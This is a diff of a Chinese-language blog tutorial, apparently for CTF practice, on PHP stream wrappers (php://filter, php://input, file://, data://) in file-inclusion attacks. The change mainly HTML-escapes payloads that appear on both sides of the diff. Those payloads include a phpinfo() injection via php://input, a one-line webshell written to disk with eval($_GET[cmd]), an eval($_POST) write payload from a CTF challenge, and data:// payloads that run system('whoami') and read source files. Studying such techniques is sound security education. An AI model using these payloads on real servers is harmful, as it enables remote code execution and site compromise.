@@ -386,7 +386,7 @@
 <h3 id="php-filter"><a class="header-anchor" href="#php-filter">¶</a>php://filter</h3>
 <p>它用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.readfile.php">readfile()</a>、 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.file.php">file()</a> 和 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>， 在数据流内容读取之前没有机会应用其他过滤器。</p>
 <blockquote>
-<p>这里提一嘴include()函数，这个函数内的文件不管后缀名是什么，只要文件内有<?php  ?>形式的代码就可以执行，如果不是php代码，则会直接返回显示</p>
+<p>这里提一嘴include()函数，这个函数内的文件不管后缀名是什么，只要文件内有<code>&lt;?php  ?&gt;</code>形式的代码就可以执行，如果不是php代码，则会直接返回显示</p>
 </blockquote>
 <p>php://filter常用的套路就是将制定文件以base64的方式编码，传入include函数，因为include函数无法识别出被base64加密后的php文件，所以不会执行，而是会直接进行输出。</p>
 <table>
@@ -419,12 +419,12 @@
 <p>1.php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）<br>
 2.php://input + [POST DATA]执行php代码</p>
 <p>如http://127.0.0.1/include.php?file=php://input<br>
-[POST DATA部分]</p>
-<?php phpinfo(); ?>
+[POST DATA部分]<br>
+<code>&lt;?php phpinfo(); ?&gt;</code></p>
 <p>若有写入权限，还可以写入一句话木马</p>
 <p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=php://input">http://127.0.0.1/include.php?file=php://input</a><br>
-[POST DATA部分]</p>
-<?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
+[POST DATA部分]<br>
+<code>&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;</code></p>
 <h4 id="例子：“强网”——EasyFilter"><a class="header-anchor" href="#例子：“强网”——EasyFilter">¶</a>例子：“强网”——EasyFilter</h4>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
     <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"./"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -448,7 +448,7 @@
     <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>简单来说，w写操作，他把变量c写入了一个名字未知的文件中，r是读操作，可以读指定路径的file</p>
 <p>从写操作考虑：构建payload</p>
-<p><code>?action=w&amp;c=&lt;?php eval($_POST[s])?&gt;</code>并post = system(“ls”)一步步找文件，之后cat即可</p>
+<p><code>?action=w&amp;c=&lt;?php eval($_POST[s])?&gt;</code>并post s= system(“ls”)一步步找文件，之后cat即可</p>
 <h2 id="file-协议"><a class="header-anchor" href="#file-协议">¶</a>file:// 协议</h2>
 <p>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。<br>
 include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。</p>
@@ -464,9 +464,9 @@ http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
 <p>[<a target="_blank" rel="noopener" href="http://192.168.43.173:8999/lsawebtest/phptest/phprotocol1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==">http://192.168.43.173:8999/lsawebtest/phptest/phprotocol1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</a>]</p>
 <p>不加//亦可。</p>
 <p>也可以用来读php文件源码：<br>
-data:text/plain,<?php system(‘cat /var/www/phprotocol1.php’)?></p>
+<code> data:text/plain,&lt;?php system(‘cat /var/www/phprotocol1.php’)?&gt;</code></p>
 <p>或者命令执行：<br>
-data:text/plain,<?php system(‘whoami’)?></p>
+<code> data:text/plain,&lt;?php system(‘whoami’)?&gt;</code></p>
 <h2 id="最后"><a class="header-anchor" href="#最后">¶</a>最后</h2>
 <p><img src="C:/Users/lim%E9%BB%8E%E6%98%8E/Desktop/20190509154902917.png" alt=""></p>
 
